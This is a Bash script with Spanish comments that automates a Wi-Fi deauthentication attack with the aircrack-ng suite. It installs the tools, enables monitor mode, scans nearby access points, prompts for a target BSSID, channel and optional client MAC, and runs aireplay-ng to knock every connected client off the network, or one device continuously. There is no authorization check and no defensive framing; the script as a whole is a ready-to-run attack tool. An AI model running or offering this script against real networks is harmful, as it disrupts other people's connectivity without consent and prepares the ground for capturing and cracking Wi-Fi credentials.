#!/bin/bash

# Comprobación de permisos de superusuario
if [ "$EUID" -ne 0 ]; then
  echo -e "\e[31mPor favor, ejecuta este script como superusuario (root).\e[0m"
  exit
fi

# Colores
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
CYAN='\e[36m'
NC='\e[0m' # No Color

# Banner
echo -e "${CYAN}"
echo "  ____       _                     _       _   _                 _   "
echo " |  _ \ __ _| | ___ _ __ ___  _ __(_) __ _| |_| |__   __ _ _ __ | |_ "
echo " | |_) / _\` | |/ _ \ '__/ _ \| '__| |/ _\` | __| '_ \ / _\` | '_ \| __|"
echo " |  __/ (_| | |  __/ | | (_) | |  | | (_| | |_| | | | (_| | | | | |_ "
echo " |_|   \__,_|_|\___|_|  \___/|_|  |_|\__,_|\__|_| |_|\__,_|_| |_|\__|"
echo "                                                                   "
echo -e "${NC}"

# Actualizar y instalar aircrack-ng si no está instalado
echo -e "${YELLOW}Actualizando los repositorios y verificando la instalación de aircrack-ng...${NC}"
apt update && apt install -y aircrack-ng

# Paso 1: Listar las interfaces Wi-Fi disponibles
echo -e "${CYAN}Detectando las interfaces Wi-Fi disponibles...${NC}"
airmon-ng
echo
read -p "Introduce el nombre de la interfaz Wi-Fi que deseas usar (ej. wlan0): " INTERFACE

# Paso 2: Habilitar el modo monitor
echo -e "${CYAN}Habilitando el modo monitor en la interfaz $INTERFACE...${NC}"
airmon-ng start $INTERFACE

# Confirmar el nombre de la nueva interfaz en modo monitor
MON_INTERFACE="${INTERFACE}mon"
echo -e "${GREEN}La interfaz en modo monitor es: $MON_INTERFACE${NC}"
echo

# Paso 3: Escanear redes Wi-Fi disponibles
echo -e "${CYAN}Escaneando las redes Wi-Fi disponibles...${NC}"
echo -e "${YELLOW}Presiona Ctrl+C una vez que hayas encontrado el AP objetivo.${NC}"
sleep 3
LOG_FILE="scan_log_$(date +'%Y%m%d_%H%M%S').txt"
airodump-ng $MON_INTERFACE | tee $LOG_FILE

echo -e "${GREEN}Los resultados del escaneo han sido guardados en $LOG_FILE${NC}"
echo

# Paso 4: Seleccionar el AP objetivo
echo -e "${CYAN}Introduce la información del AP objetivo.${NC}"
read -p "BSSID del AP: " BSSID
read -p "Canal del AP (CH): " CHANNEL

# Paso 5: Enfocar el escaneo en el AP objetivo
echo -e "${CYAN}Enfocando el escaneo en el AP con BSSID $BSSID en el canal $CHANNEL...${NC}"
echo -e "${YELLOW}Presiona Ctrl+C cuando quieras detener el escaneo.${NC}"
sleep 3
airodump-ng --bssid $BSSID --channel $CHANNEL $MON_INTERFACE | tee -a $LOG_FILE

echo -e "${GREEN}Los resultados del escaneo enfocado han sido añadidos a $LOG_FILE${NC}"
echo

# Paso 6: Seleccionar el objetivo del ataque de deauth
echo -e "${CYAN}Introduce la dirección MAC del dispositivo objetivo (deja en blanco para atacar a todos):${NC}"
read -p "MAC del dispositivo: " TARGET_MAC

# Paso 7: Ejecutar el ataque de deauth
if [ -z "$TARGET_MAC" ]; then
  echo -e "${RED}Realizando un ataque de deauth a todos los dispositivos conectados al AP...${NC}"
  aireplay-ng --deauth 10 -a $BSSID $MON_INTERFACE
else
  echo -e "${RED}Realizando un ataque de deauth al dispositivo con MAC $TARGET_MAC...${NC}"
  aireplay-ng --deauth 0 -a $BSSID -c $TARGET_MAC $MON_INTERFACE
fi

# Paso 8: Deshabilitar el modo monitor y volver al modo gestionado
echo -e "${CYAN}Deshabilitando el modo monitor...${NC}"
airmon-ng stop $MON_INTERFACE

echo -e "${GREEN}Proceso completado.${NC}"
